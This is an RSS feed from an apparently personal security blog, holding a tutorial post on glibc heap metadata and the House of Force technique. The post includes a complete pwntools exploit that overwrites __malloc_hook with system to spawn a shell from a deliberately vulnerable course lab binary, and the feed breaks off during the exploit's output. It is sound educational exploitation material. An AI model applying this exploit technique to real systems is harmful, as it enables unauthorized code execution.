<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>binary-exploitation on Adam Gold</title>
    
    
    
    <link>https://adamgold.github.io/tags/binary-exploitation/</link>
    <description>Recent content in binary-exploitation on Adam Gold</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 01 Aug 2020 17:47:42 +0300</lastBuildDate>
    
	<atom:link href="https://adamgold.github.io/tags/binary-exploitation/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Basic Heap Exploitation: House of Force</title>
      <link>https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/</link>
      <pubDate>Sat, 01 Aug 2020 17:47:42 +0300</pubDate>
      
      <guid>https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/</guid>
      <description>
        
          
          
          
        
        
        &lt;p&gt;I recently finished a Linux heap exploitation &lt;a href=&#34;https://www.udemy.com/course/linux-heap-exploitation-part-1/?referralCode=362370A773BCC3F2730A&#34;&gt;course&lt;/a&gt; (Referral link is instructor&amp;rsquo;s, not mine!), aimed to teach how the heap works and some popular exploitation techniques that are possible to execute once you are familiar with the heap&amp;rsquo;s metadata. In this short article, I will try to showcase some of the things that I have learned, with some examples.&lt;/p&gt;
&lt;h2 id=&#34;learning-the-basics-of-the-heap&#34;&gt;Learning the Basics of the Heap&lt;/h2&gt;
&lt;p&gt;Before diving into the exploitation details, you first need to understand what the heap is and its metadata structure.&lt;/p&gt;
&lt;h3 id=&#34;what-is-the-heap&#34;&gt;What is the heap?&lt;/h3&gt;
&lt;p&gt;The heap is the portion of memory where dynamically allocated memory resides. Dynamic memory allocating is used when a program does not know the size or number of objects in memory it needs prior to runtime (hence dynamic).
Unlike the stack where memory is allocated and released in a very defined order, individual data elements allocated on the heap are typically released in ways which is asynchronous from one another.&lt;/p&gt;
&lt;p&gt;Heap memory is essentially a large pool of memory (typically per process) from which the running program can request chunks during runtime. The heap is divided into &amp;ldquo;chunk&amp;rdquo; - large, contiguous blocks of memory requested from the kernel.&lt;/p&gt;
&lt;p&gt;You may think that this is only relevant to low-level programming, for example the usage of &lt;code&gt;malloc&lt;/code&gt; in C (which will be covered later in this article) - But the heap is actually being used under the hood in many of the basic programming operations, even in high level languages such as Python or Ruby.&lt;/p&gt;
&lt;p&gt;The heap is organized and implemented by a series of data structures, forming the heap metadata.&lt;/p&gt;
&lt;div class=&#34;toast toast--blue add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Note&lt;/p&gt;
		&lt;p class=&#34;toast__message&#34;&gt;
			It&amp;rsquo;s important to note that throughout this post, only the GLIBC heap implementation will be discussed.
		&lt;/p&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;h3 id=&#34;heap-metadata&#34;&gt;Heap Metadata&lt;/h3&gt;
&lt;p&gt;In order to see and understand how the heap is implemented, you will need to have an understanding of the &lt;code&gt;malloc&lt;/code&gt; function.&lt;/p&gt;
&lt;p&gt;GLIBC&amp;rsquo;s &lt;code&gt;malloc&lt;/code&gt; function allows developers to request dynamic memory allocation. It takes a single argument - the size in bytes, and returns a pointer to that amount of memory.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As you can see, it&amp;rsquo;s very simple to use. This means that all of the &amp;ldquo;magic&amp;rdquo; happens under the hood - And what can be more exciting than unrevealing it?&lt;/p&gt;
&lt;div class=&#34;toast toast--blue add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Note&lt;/p&gt;
		&lt;p class=&#34;toast__message&#34;&gt;
			If you wish to explore further, you can check out &lt;code&gt;malloc&lt;/code&gt;&#39;s &lt;a href=&#34;https://code.woboq.org/userspace/glibc/malloc/malloc.c.html&#34;&gt;source code&lt;/a&gt;.
		&lt;/p&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;h3 id=&#34;debugging-with-gdb&#34;&gt;Debugging with &lt;code&gt;gdb&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;Suppose a programmer asks for, say, 16 bytes of memory. To service this request, the heap manager needs to do more than just find a random 16 byte region that the programmer can write to. The heap manager also needs to store metadata about the allocation. This metadata is stored alongside the 16-byte region that the programmer can use.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s hop onto &lt;code&gt;gdb&lt;/code&gt; to see how it plays out.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;In file: /home/adamgold/Documents/malloc_demo.c
    5     char *e = malloc(16);
    6
    7     malloc(1);
    8     malloc(0);
    9
   10     malloc(24);
   11     malloc(25);
   12
 â–º 13     return 0;
   14 }

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The code above requests 5 chunk - with sizes of 16, 1, 0, 24 and 25. The breakpoint is set just after the request for the 25-bytes chunk. Using the &lt;code&gt;vis_heap_chunks&lt;/code&gt; (or &lt;code&gt;vis&lt;/code&gt;) command to display the heap, you can inspect the heap layout:&lt;/p&gt;

&lt;figure &gt;
    
        &lt;img class=&#34;center&#34; src=&#34;https://adamgold.github.io/img/heap_visual.png&#34;
             /&gt;
        
    
&lt;/figure&gt;

&lt;p&gt;Let&amp;rsquo;s break it down: We can see 7 different colors, although only 5 chunk requested. As mentioned before, metadata is stored inline - The heap does not store user data alone.&lt;/p&gt;
&lt;p&gt;There are 4 parts that start with &lt;code&gt;0x0000000000000021&lt;/code&gt; followed by 24 bytes. The first 8 bytes are the size field - It&amp;rsquo;s where the size of each chunk is saved, along with some flags such as the &amp;ldquo;prev in use&amp;rdquo; flag. The following 24 bytes are the user data. You can see that 24 bytes have been assigned to all of the first 4 requests - Even though we requested for 16, 1, 0 and 24 respectively. This is because &lt;code&gt;malloc&lt;/code&gt; has a minimum chunk size of 24 bytes of user data - even when using &lt;code&gt;malloc(0)&lt;/code&gt;. So, the size is filled with &lt;code&gt;0x20&lt;/code&gt; (=32), which is 24 bytes of user data + 8 bytes of meta data.
After that, you can see a size field of &lt;code&gt;0x31&lt;/code&gt;. This means that the size field increment in 8 each time - 40 bytes for &lt;code&gt;malloc(25)&lt;/code&gt;. This is why the least significant bit is not used (&lt;code&gt;0x20&lt;/code&gt;, &lt;code&gt;0x30&lt;/code&gt;, &lt;code&gt;0x40&lt;/code&gt;&amp;hellip;) and can be used for flags.&lt;/p&gt;
&lt;p&gt;If you were wondering what the &amp;ldquo;prev in use&amp;rdquo; flag does - It&amp;rsquo;s there to mark if the previous chunk is freed or not. Chunks are in either of 2 mutually exclusive states: allocated or free. When a chunk is free, up to 5 quadwords of its user data are repurposed as metadata.&lt;/p&gt;
&lt;p&gt;The last value - &lt;code&gt;0x0000000000020f51&lt;/code&gt; states the size of the &amp;ldquo;top chunk&amp;rdquo; - meaning the size of all the remaining memory in the heap.&lt;/p&gt;
&lt;p&gt;This is where we&amp;rsquo;ll stop exploring the heap metadata for this post - But there is much more to learn, such as the types of freed chunks, unlinking vulnerabilities, and many more. The House of Force technique does not require this knowledge.&lt;/p&gt;
&lt;h2 id=&#34;discovering-the-house-of-force-technique&#34;&gt;Discovering the House of Force Technique&lt;/h2&gt;
&lt;p&gt;The House of Force technique is a simple one for achieving code execution on older binaries. It does not rely on complicated internal logics (such as House of Orange, for example) but it is a good start and, yeah, it&amp;rsquo;s pretty cool!&lt;/p&gt;
&lt;h3 id=&#34;understanding-the-theory&#34;&gt;Understanding the theory&lt;/h3&gt;
&lt;p&gt;In GLIBC versions &amp;lt; 2.29, top chunk size fields are not subject to any integrity checks during allocations. This means that you can write any value into it.&lt;/p&gt;
&lt;p&gt;Basically, what you are going to be doing is to overflow a chunk in order to write a really large value into the &amp;ldquo;wilderness&amp;rdquo;, the top chunk. This will allow you to wrap around the virtual address space and then when you make another request, you&amp;rsquo;ll be able to get any address you want in memory. For example, you&amp;rsquo;ll be able to get addresses from the binary data section (which is in a lower address than the heap). Sounds complicated? Fear not! Let&amp;rsquo;s exploit an actual binary.&lt;/p&gt;
&lt;h3 id=&#34;exploiting-a-binary-using-house-of-force&#34;&gt;Exploiting a binary using House of Force&lt;/h3&gt;
&lt;p&gt;We are going to exploit a very simple binary, just to showcase the HOF technique. The binary is available after purchasing the course.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; checksec
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
    RUNPATH:  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;../.glibc/glibc_2.28_no-tcache&amp;#39;&lt;/span&gt;
pwndbg&amp;gt; r
Starting program: /home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force

&lt;span style=&#34;color:#f92672&#34;&gt;===============&lt;/span&gt;
|   HeapLAB   |  House of Force
&lt;span style=&#34;color:#f92672&#34;&gt;===============&lt;/span&gt;

puts&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; @ 0x7ffff7a8ef10
heap @ 0x603000

1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; malloc 0/4
2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; target
3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; quit

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The binary leaks the address of libc &lt;code&gt;puts&lt;/code&gt; and the heap base address for simplicity. It is linked to GLIBC 2.28, so we can use the HOF technique.&lt;/p&gt;
&lt;p&gt;After some time playing with the binary, it seems that there&amp;rsquo;s a heap overflow when using the malloc functionality. Here&amp;rsquo;s a quick proof of concept showing an override of the top chunk:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;house_of_force&amp;#34;&lt;/span&gt;)
libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;libc

io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start()

gs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;continue
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GDB:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;debug(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path, gdbscript&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gs)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; process(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path)

&lt;span style=&#34;color:#75715e&#34;&gt;# Select the &amp;#34;malloc&amp;#34; option, send size &amp;amp; data.&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;malloc&lt;/span&gt;(size, data):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;size: &amp;#34;&lt;/span&gt;, f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{size}&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;data: &amp;#34;&lt;/span&gt;, data)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# This binary leaks the address of puts(), use it to resolve the libc load address.&lt;/span&gt;
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts() @ &amp;#34;&lt;/span&gt;)
libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;puts

&lt;span style=&#34;color:#75715e&#34;&gt;# This binary leaks the heap start address.&lt;/span&gt;
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;heap @ &amp;#34;&lt;/span&gt;)
heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)

malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;))

io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; vis

0x603000	0x0000000000000000	0x0000000000000021	........!.......
0x603010	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x603020	0x5959595959595959	0xffffffffffffffff	YYYYYYYY........ &amp;lt;-- Top chunk

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;What&amp;rsquo;s left to do now is to get a shell by interrupting the program flow, easy right?&lt;/p&gt;
&lt;p&gt;We can use &lt;code&gt;__malloc_hook&lt;/code&gt;, a function that is being called before &lt;code&gt;malloc&lt;/code&gt; - Overriding it with the &lt;code&gt;system&lt;/code&gt; address could give a shell!&lt;/p&gt;
&lt;p&gt;The distance from the top chunk required to is &lt;code&gt;MALLOC_HOOK_ADDRESS - (HEAP_BASE + 0x20)&lt;/code&gt;. Notice the &lt;code&gt;0x20&lt;/code&gt; required to account for the already allocated chunk. We can add the following allocation:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;distance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__malloc_hook &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
malloc(distance, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And when running the script with gdb:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; dq &amp;amp;__malloc_hook
00007ffff7dd0c10     &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;
00007ffff7dd0c20     &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; ffff8000088323f9
00007ffff7dd0c30     &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;
00007ffff7dd0c40     &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;
pwndbg&amp;gt; top_chunk
Top chunk
Addr: 0x7ffff7dd0c20
Size: 0xffff8000088323f9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Great! Our &lt;code&gt;top_chunk&lt;/code&gt; is right at the start of &lt;code&gt;__malloc_hook&lt;/code&gt;. One more request will enable us to overwrite the hook.&lt;/p&gt;
&lt;p&gt;But before we do that, &lt;code&gt;system&lt;/code&gt; will have to be called with &lt;code&gt;/bin/sh&lt;/code&gt;. We can insert &lt;code&gt;bin/sh&lt;/code&gt; right before the hook - as we know the address there. For that to work, we would need to overwrite &lt;code&gt;0x20&lt;/code&gt; bits before the hook, write &lt;code&gt;/bin/sh&lt;/code&gt;, and then make one more allocation request for the actual address overriding. Final exploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;house_of_force&amp;#34;&lt;/span&gt;)
libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;libc

io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start()

gs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;continue
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GDB:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;debug(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path, gdbscript&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gs)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; process(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path)

&lt;span style=&#34;color:#75715e&#34;&gt;# Select the &amp;#34;malloc&amp;#34; option, send size &amp;amp; data.&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;malloc&lt;/span&gt;(size, data):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;size: &amp;#34;&lt;/span&gt;, f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{size}&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;data: &amp;#34;&lt;/span&gt;, data)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# This binary leaks the address of puts(), use it to resolve the libc load address.&lt;/span&gt;
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts() @ &amp;#34;&lt;/span&gt;)
libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;puts

&lt;span style=&#34;color:#75715e&#34;&gt;# This binary leaks the heap start address.&lt;/span&gt;
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;heap @ &amp;#34;&lt;/span&gt;)
heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)

malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;))
distance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__malloc_hook &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
malloc(distance, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# start with /bin/sh and place the chunk right before malloc hook&lt;/span&gt;
malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system)) &lt;span style=&#34;color:#75715e&#34;&gt;# overwrite malloc hook&lt;/span&gt;

cmd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# address to /bin/sh (parameter to malloc which is essentialy parameter to system)&lt;/span&gt;
malloc(cmd, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)

io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And there&amp;rsquo;s our shell!&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adamgold@adamgold-VirtualBox:~/Documents/courses/HeapLAB/house_of_force$ python3 exp.py
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
    RUNPATH:  b&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;../.glibc/glibc_2.28_no-tcache&amp;#39;&lt;/span&gt;
